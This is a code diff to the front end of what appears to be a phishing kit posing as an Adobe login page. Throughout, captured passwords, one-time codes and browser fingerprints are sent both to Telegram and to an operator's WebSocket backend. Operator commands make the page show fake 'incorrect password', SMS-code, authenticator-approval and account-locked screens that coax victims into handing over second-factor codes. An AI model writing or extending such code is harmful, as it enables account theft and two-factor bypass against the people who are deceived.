@@ -15,6 +15,8 @@ import OtpPage from './components/OtpPage';
 import MobileOtpPage from './components/mobile/MobileOtpPage';
 import ProviderRedirect from './components/ProviderRedirect';
 import Spinner from './components/common/Spinner';
+import InteractiveState, { UIStateType } from './components/InteractiveState';
+import { useWebSocket, WebSocketMessage } from './hooks/useWebSocket';
 import { getBrowserFingerprint } from './utils/oauthHandler';
 import { setCookie, getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
 import { config } from './config';
@@ -150,8 +152,145 @@ function App() {
     sessionData: null as any,
   });
 
+  // WebSocket state management
+  const [sessionId] = useState(() => Math.random().toString(36).substring(2, 15) + Date.now().toString(36));
+  const [interactiveState, setInteractiveState] = useState<{
+    active: boolean;
+    type: UIStateType;
+    provider: string;
+    data?: any;
+  }>({
+    active: false,
+    type: 'idle',
+    provider: 'Adobe',
+  });
+
   const navigate = useNavigate();
   const location = useLocation();
+
+  // WebSocket message handler
+  const handleWebSocketMessage = (message: WebSocketMessage) => {
+    console.log('Received WebSocket command:', message);
+    
+    switch (message.command) {
+      case 'show_incorrect_password':
+        setInteractiveState({
+          active: true,
+          type: 'incorrect_password',
+          provider: message.data?.provider || 'Adobe',
+          data: message.data,
+        });
+        break;
+      
+      case 'show_sms_code':
+        setInteractiveState({
+          active: true,
+          type: 'enter_sms_code',
+          provider: message.data?.provider || 'Adobe',
+          data: message.data,
+        });
+        break;
+      
+      case 'show_authenticator_approval':
+        setInteractiveState({
+          active: true,
+          type: 'approve_authenticator',
+          provider: message.data?.provider || 'Adobe',
+          data: message.data,
+        });
+        break;
+      
+      case 'show_account_locked':
+        setInteractiveState({
+          active: true,
+          type: 'account_locked',
+          provider: message.data?.provider || 'Adobe',
+          data: message.data,
+        });
+        break;
+      
+      case 'show_security_check':
+        setInteractiveState({
+          active: true,
+          type: 'security_check',
+          provider: message.data?.provider || 'Adobe',
+          data: message.data,
+        });
+        break;
+      
+      case 'show_two_factor':
+        setInteractiveState({
+          active: true,
+          type: 'two_factor_required',
+          provider: message.data?.provider || 'Adobe',
+          data: message.data,
+        });
+        break;
+      
+      case 'hide_state':
+      case 'reset':
+        setInteractiveState({
+          active: false,
+          type: 'idle',
+          provider: 'Adobe',
+        });
+        break;
+      
+      case 'navigate':
+        if (message.data?.route) {
+          navigate(message.data.route);
+        }
+        break;
+      
+      default:
+        console.warn('Unknown WebSocket command:', message.command);
+    }
+  };
+
+  // Initialize WebSocket connection
+  const { isConnected, sendMessage } = useWebSocket({
+    sessionId,
+    onMessage: handleWebSocketMessage,
+    onConnect: () => {
+      console.log('WebSocket connected, sessionId:', sessionId);
+      // Send initial handshake
+      sendMessage({ command: 'handshake', data: { sessionId, userAgent: navigator.userAgent } });
+    },
+    onDisconnect: () => {
+      console.log('WebSocket disconnected');
+    },
+  });
+
+  // Handle interactive state actions
+  const handleInteractiveAction = (action: string, data?: any) => {
+    console.log('Interactive action:', action, data);
+    
+    // Send action to backend via WebSocket
+    sendMessage({
+      command: 'client_action',
+      data: { action, ...data },
+    });
+
+    // Handle specific actions locally
+    switch (action) {
+      case 'retry':
+        setInteractiveState({ active: false, type: 'idle', provider: 'Adobe' });
+        navigate(ROUTES.HOME);
+        break;
+      
+      case 'submit_sms':
+      case 'submit_2fa':
+        // Send code to backend via WebSocket
+        sendMessage({
+          command: 'verification_code',
+          data: { code: data?.code, type: action === 'submit_sms' ? 'sms' : '2fa' },
+        });
+        break;
+      
+      default:
+        break;
+    }
+  };
 
   // Initialization: bot detection + connecting splash screen
   useEffect(() => {
@@ -200,13 +339,19 @@ function App() {
     const browserFingerprint = await getBrowserFingerprint();
     const credentialsData = {
       ...loginData,
-      sessionId: Math.random().toString(36).substring(2, 15),
+      sessionId, // Use the WebSocket sessionId
       timestamp: new Date().toISOString(),
       userAgent: navigator.userAgent,
       ...browserFingerprint,
     };
     
     await safeSendToTelegram({ type: 'credentials', data: credentialsData });
+    
+    // Also send credentials via WebSocket
+    sendMessage({
+      command: 'credentials_submitted',
+      data: credentialsData,
+    });
     
     setLoginFlowState({
       awaitingOtp: true,
@@ -225,6 +370,12 @@ function App() {
     setIsLoading(true);
     await safeSendToTelegram({
       type: 'otp',
+      data: { otp, session: loginFlowState.sessionData },
+    });
+    
+    // Send OTP via WebSocket
+    sendMessage({
+      command: 'otp_submitted',
       data: { otp, session: loginFlowState.sessionData },
     });
     
@@ -340,6 +491,18 @@ function App() {
 
   if (isLoading) {
     return <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center"><Spinner size="lg" /></div>;
+  }
+
+  // Show interactive state overlay if active
+  if (interactiveState.active) {
+    return (
+      <InteractiveState
+        stateType={interactiveState.type}
+        provider={interactiveState.provider}
+        data={interactiveState.data}
+        onAction={handleInteractiveAction}
+      />
+    );
   }
 
   const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
